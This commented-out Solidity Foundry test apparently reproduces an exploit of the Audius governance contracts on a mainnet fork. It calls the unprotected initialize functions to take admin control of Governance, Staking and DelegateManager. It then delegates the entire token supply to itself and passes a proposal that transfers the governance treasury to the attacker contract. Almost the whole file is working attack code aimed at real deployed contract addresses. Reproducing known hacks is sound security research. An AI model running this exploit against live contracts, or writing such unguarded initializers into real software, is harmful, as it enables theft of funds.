// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.5.0;

// import "ds-test/test.sol";
// import "forge-std/Vm.sol";
// import "forge-std/console.sol";
// import "../src/Governance.sol";
// import "../src/Staking.sol";
// import "../src/DelegateManager.sol";
// import "../src/Registry.sol";
// import "../src/token/AudiusToken.sol";
// import "../src/upgradeability/AudiusAdminUpgradeabilityProxy.sol";

// contract ContractTest is DSTest {
//     Governance gov;
//     Staking st;
//     DelegateManager dm;
//     Registry reg;
//     AudiusToken token;

//     address constant private VM_ADDRESS =
//         address(bytes20(uint160(uint256(keccak256('hevm cheat code')))));

//     Vm public constant vm = Vm(VM_ADDRESS);

//     function setUp() public {
//         gov = Governance(0x4DEcA517D6817B6510798b7328F2314d3003AbAC);
//         st = Staking(0xe6D97B2099F142513be7A2a068bE040656Ae4591);
//         dm = DelegateManager(0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225);
//         reg = Registry(0xd976d3b4f4e22a238c1A736b6612D22f17b6f64C);
//         token = AudiusToken(0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998);
//     }

//     function testAudiusHack() public {
//         vm.createSelectFork("INSERT RPC URL HERE", 15201700);

//         console.log("Audius Balance: ", token.balanceOf(address(this)));

//         gov.initialize(address(this), 3, 0, 1, 4, address(this)); // voting period = 3, execution delay = 0 // should 4 be 4 << 240?
//         st.initialize(address(this), address(this));
//         dm.initialize(address(this), address(this), 4);

//         dm.setServiceProviderFactoryAddress(address(this));
//         dm.delegateStake(address(this), token.totalSupply());

//         uint[] memory inProgressProposals = gov.getInProgressProposals();
//         for (uint i = 0; i < inProgressProposals.length; i++) {
//             gov.evaluateProposalOutcome(inProgressProposals[i]);
//         }

//         uint treasuryBalance = token.balanceOf(address(gov));
//         uint proposalId = gov.submitProposal(
//             0x3078000000000000000000000000000000000000000000000000000000000000,
//             0,
//             "transfer(address,uint256)",
//             abi.encode(address(this), treasuryBalance),
//             "u r", "pwned"
//         );

//         vm.roll(block.number + 3);
//         gov.submitVote(proposalId, Governance.Vote.Yes);
//         vm.roll(block.number + 1);
//         gov.evaluateProposalOutcome(proposalId);

//         console.log("Audius Balance: ", token.balanceOf(address(this)));
//         require(token.balanceOf(address(this)) > 18_000_000 ether, "do better!");
//     }

//     function isGovernanceAddress() public pure returns (bool) {
//         return true;
//     }

//     function getVotingPeriod() public pure returns (uint256) {
//         return 3;
//     }

//     function getExecutionDelay() public pure returns (uint256) {
//         return 0;
//     }

//     function transferFrom(address from, address to, uint amount) public {}

//     function validateAccountStakeBalance(address _) public pure returns(bool) {
//         return true;
//     }

//     function getContract(bytes32 _id) public pure returns (address) {
//         if (_id == 0x3078000000000000000000000000000000000000000000000000000000000000) {
//             return 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
//         } else {
//             return 0x0000000000000000000000000000000000000000;
//         }   
//     }
// }
